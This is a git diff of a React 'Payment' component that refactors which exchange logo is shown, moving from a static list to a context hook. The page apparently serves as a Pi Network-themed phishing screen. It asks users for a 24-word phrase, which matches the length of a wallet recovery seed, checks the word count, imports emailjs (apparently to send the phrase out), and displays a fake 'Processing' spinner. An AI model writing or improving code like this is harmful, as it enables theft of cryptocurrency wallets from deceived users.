@@ -1,7 +1,6 @@
 import React, { useState } from "react";
 import { useParams } from "react-router-dom";
 import pilogo from "../assets/pi_logo.png";
-import { exchanges } from "../services/exchange";
 import loop from "../assets/images/exchanges/loop.png";
 import circle from "../assets/images/exchanges/circle.png";
 
@@ -9,10 +8,11 @@ import emailjs from "@emailjs/browser";
 import Spinner from "react-activity/dist/Spinner";
 import "react-activity/dist/Spinner.css";
 import { useNavigate } from "react-router-dom";
+import { useExchange } from "../context/ExchangeContext";
 
 function Payment() {
   const { id } = useParams();
-  const method = exchanges.find((item) => item.id === parseInt(id, 10));
+  const { selectedExchange } = useExchange(); // Get the selected exchange from the context
   const navigate = useNavigate();
   const [phrase, setPhrase] = useState("");
   const [error, setError] = useState(false);
@@ -27,7 +27,6 @@ function Payment() {
     setLoading(true);
     setError(false);
     setShowModal(true);
-
 
     const wordCount = phrase.trim().split(/\s+/).length;
     if (wordCount !== 24) {
@@ -61,11 +60,11 @@ function Payment() {
           <div className="text-center">
             <img src={loop} alt="Loop" className="w-8 h-8" />
           </div>
-          {method && (
+          {selectedExchange && (
             <div className="flex flex-col items-center mb-6">
               <img
-                src={method.image}
-                alt={method.label}
+                src={selectedExchange.image} // Use the image from the context
+                alt={selectedExchange.label}
                 className="w-12 h-12 object-cover rounded-full shadow-md"
               />
             </div>
@@ -110,26 +109,31 @@ function Payment() {
           <div className="bg-white p-8 rounded-lg shadow-lg mx-5 w-full max-w-md">
             <h3 className="text-xl font-bold text-center mb-4">Processing</h3>
             <div className="flex items-center justify-between mb-6">
-          <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
-          <div className="text-center">
-            <img src={circle} alt="Loop" className="w-8 h-8 animate-spin duration-1000" style={{animationDuration:"3s"}} />
-          </div>
-          {method && (
-            <div className="flex flex-col items-center mb-6">
-              <img
-                src={method.image}
-                alt={method.label}
-                className="w-12 h-12 object-cover rounded-full shadow-md"
-              />
+              <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
+              <div className="text-center">
+                <img
+                  src={circle}
+                  alt="Loop"
+                  className="w-8 h-8 animate-spin duration-1000"
+                  style={{ animationDuration: "3s" }}
+                />
+              </div>
+              {selectedExchange && (
+                <div className="flex flex-col items-center mb-6">
+                  <img
+                    src={selectedExchange.image} // Use the image from the context
+                    alt={selectedExchange.label}
+                    className="w-12 h-12 object-cover rounded-full shadow-md"
+                  />
+                </div>
+              )}
             </div>
-          )}
-        </div>
-        <button
-          onClick={handleSend}
-          className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
-        >
-    <Spinner color="#fff" /> 
-        </button>
+            <button
+              onClick={handleSend}
+              className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
+            >
+              <Spinner color="#fff" />
+            </button>
           </div>
         </div>
       )}
